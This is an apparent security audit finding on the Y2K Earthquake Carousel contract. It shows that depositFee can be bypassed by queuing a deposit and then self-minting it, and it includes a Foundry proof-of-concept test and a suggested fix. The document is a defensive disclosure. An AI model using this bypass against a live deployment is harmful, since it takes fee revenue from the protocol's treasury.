# `depositFee` can be bypassed

## Summary
A user can queue and directly mint their queued item into the next epoch instead of depositing and paying `depositFee`

## Vulnerability Detail
When depositing into Carousel a user has to pay a variable fee to `treasury` to tax informational advantage:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L479-L489

This fee is not payed when queuing though:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L494-L497

The queue isn't really a queue either but a stack so when queuing the user queuing is guaranteed to be the next one minted:
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L332-L333

The `relayerFee` payed for minting is returned to the minter so a user can simply queue `amount + relayerFee` and then directly mint their own queued item to bypass `depositFee`


PoC test in `CarouselTest.t.sol`:
```solidity
    function testUser2BypassesDepositFee() public {
        uint40 epochBegin = uint40(block.timestamp + 1 days);
        uint40 epochEnd = uint40(epochBegin + 1 days);
        uint256 epochId = 2;
        vault.setEpoch(epochBegin, epochEnd, epochId);

        // just before epoch begins
        vm.warp(epochBegin - 1);

        uint256 amount = 10 ether;

        // user deposits directly and pays fee
        vm.startPrank(USER);
        MintableToken(UNDERLYING).approve(address(vault), amount);
        vault.deposit(epochId, amount, USER);
        vm.stopPrank();

        // user 2 deposits amount + relayer fee in queue, then mints their own position
        uint256 user2Before = IERC20(UNDERLYING).balanceOf(USER2);
        vm.startPrank(USER2);
        IERC20(UNDERLYING).approve(address(vault), amount + vault.relayerFee());
        vault.deposit(0, amount + vault.relayerFee(), USER2);
        vault.mintDepositInQueue(epochId, 1);
        vm.stopPrank();
        uint256 user2After = IERC20(UNDERLYING).balanceOf(USER2);

        // user has to pay fee
        assertLt(vault.balanceOf(USER,epochId),amount);

        // user2 didn't pay any fee
        assertEq(vault.balanceOf(USER2,epochId),amount);
        // since they got their relayer fee back for relaying themselves
        assertEq(user2Before - user2After,amount);
    }
```

Since the requirements for depositing into an epoch and minting a queued deposit into an epoch are the same this can always be done:

and

## Impact
A user don't have to pay `depositFee` if they queue and directly mint their position.

## Recommendation
I recommend that instead of storing the `epochId` (which is always 0 anyways) on the `QueueItem` store `block.timestamp`.
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Carousel/Carousel.sol#L495-L497

Then when minting deposits, compare the timestamp to `epochCreated`/`epochBegin` of the epoch minted into, if within, apply `depositFee`.
